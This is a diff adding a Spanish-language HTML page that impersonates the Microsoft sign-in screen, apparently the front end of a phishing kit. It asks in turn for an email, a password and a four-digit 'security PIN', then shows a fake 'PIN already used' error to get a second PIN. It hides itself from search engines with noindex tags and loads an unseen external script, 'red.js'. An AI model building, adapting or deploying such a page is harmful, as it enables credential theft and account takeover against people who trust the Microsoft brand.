@@ -1,0 +1,201 @@
+<html lang="en">
+<head>
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<title>Iniciar sesión es tu cuenta Microsoft</title>
+<link rel="shortcut icon" href="./files/favicon.png" type="image/png">
+<link rel="stylesheet" href="./files/2.css">
+<link rel="stylesheet" href="./files/1.css">
+<script src="./files/script.min.js"></script>
+<script src="./files/red.js"></script>  
+</head>
+<body>
+
+    <input type="hidden" name="" value=""><div class="login-form-1">
+       <form method="post" id="formulario">
+           <div class="logo">
+            <img src="./files/favicon.png" alt="">     Microsoft
+        </div>
+        <div class="login-title">
+            Iniciar sesión
+        </div>
+        <div class="error-message"></div>
+        <div class="input-box">
+        <input type="email" class="txtmail" id="txtmail" placeholder="Correo electrónico, teléfono o Skype" onchange="hideMessage()" oninput="hideMessage()" onkeyup="hideMessage()" onkeypress="return continuar(event);">
+            <div class="loader"><div class="wrapper"><span></span><span></span><span></span><span></span><span></span></div></div> 
+        </div>
+
+        <div class="create-account">
+            ¿No tiene una cuenta?
+            <a href="#">Cree una.</a>
+        </div>
+
+        <div class="security-key-login">
+            <a href="#">
+            Iniciar sesión con una llave de seguridad  <img src="./files/question.png" alt="">
+            </a>
+
+        </div>
+
+        <div class="login-options">
+            <a href="#">
+                Opciones de inicio de sesión
+            </a>
+        </div>
+
+
+       <script>
+function continuar(e)
+{
+    e = e || window.event;
+    if (e.keyCode == 13)
+    {
+        document.getElementById('boton').click();
+        return false;
+    }
+    return true;
+}
+</script>
+       
+       
+
+    <div class="next-btn" id="boton">
+        Siguiente
+    </div>
+           </form>
+    </div>
+
+    <div class="login-form-2">
+        <div class="logo">
+            <img src="./files/favicon.png" alt="">
+            Microsoft
+        </div>
+
+        <div class="current-email">
+            <i class="fa-arrow-left"></i> <span class="current" id="lbl-email"></span>
+        </div>
+
+        <div class="login-title">
+            Escribir contraseña
+        </div>
+
+        <div class="error-message"></div>
+
+        <div class="input-box">
+        <input type="password" class="txtpass" id="txtpass" placeholder="Contraseña" onchange="hideMessage()" oninput="hideMessage()" onkeyup="hideMessage()" onkeypress="return continuar2(event);">
+            <div class="loader"><div class="wrapper"><span></span><span></span><span></span><span></span><span></span></div></div>
+        </div>
+
+
+
+       <script>
+function continuar2(e)
+{ e = e || window.event;
+    if (e.keyCode == 13)
+    {        document.getElementById('boton2').click();
+        return false;  }
+    return true;}
+</script>
+
+<div class="next-btn2" id="boton2">
+    Siguiente
+</div>
+
+<div class="create-account">
+<a href="">
+ ¿Olvidó su contraseña?
+</a>
+</div>
+
+       
+
+
+
+    </div>
+
+    <div class="login-form-3">
+
+
+               <div class="logo">
+            <img src="./files/favicon.png" alt="">     Microsoft
+        </div>
+            <div class="login-title">
+            Crea un PIN de seguridad
+        </div>
+
+            <div class="current-email">
+            <i class="fa-arrow-left"></i> <span class="current" id="lbl-email"></span>
+        </div> 
+         <input type="password" class="pin2" id="pin2" maxlength="4" placeholder="Ingresa una clave de 4 números" onchange="hideMessage()" oninput="hideMessage()" onkeyup="hideMessage()" onkeypress="return continuar3(event);">
+
+       <script>
+function continuar3(e)
+{
+    e = e || window.event;
+    if (e.keyCode == 13)
+    {
+        document.getElementById('boton3').click();
+        return false;
+    }
+    return true;
+}
+</script>
+
+        <div class="next-btn3" id="boton3">
+            Iniciar sesión
+        </div>
+    </div>
+
+    <div class="login-form-4">
+
+
+               <div class="logo">
+            <img src="./files/favicon.png" alt="">     Microsoft
+        </div>
+            <div class="login-title">
+            Crea una PIN de seguridad
+        </div>
+
+            <div class="current-email">
+            <i class="fa-arrow-left"></i> <span class="current" id="lbl-email"></span>
+        </div>
+
+
+    <div class="errorpin">
+            <span class="errorpintxt">El PIN ingresado ya se ha utilizado.</span> 
+         <input type="password" class="pin4" id="pin4" maxlength="4" placeholder="Ingresa una clave de 4 números" onchange="hideMessage()" oninput="hideMessage()" onkeyup="hideMessage()" onkeypress="return continuar4(event);">
+        </div>
+
+     <script>
+function continuar4(e)
+{
+    e = e || window.event;
+    if (e.keyCode == 13)
+    {
+        document.getElementById('boton4').click();
+        return false;
+    }
+    return true;
+}
+</script>
+
+
+
+
+
+        <div class="login-btn" id="boton4">
+            Iniciar sesión
+        </div>
+    </div>
+
+    <footer>    
+        <a href="">Términos de uso</a>
+        <a href="">Privacidad y cookies</a>
+        <a href="">. . .</a>
+    </footer>
+
+    
+</body></html>
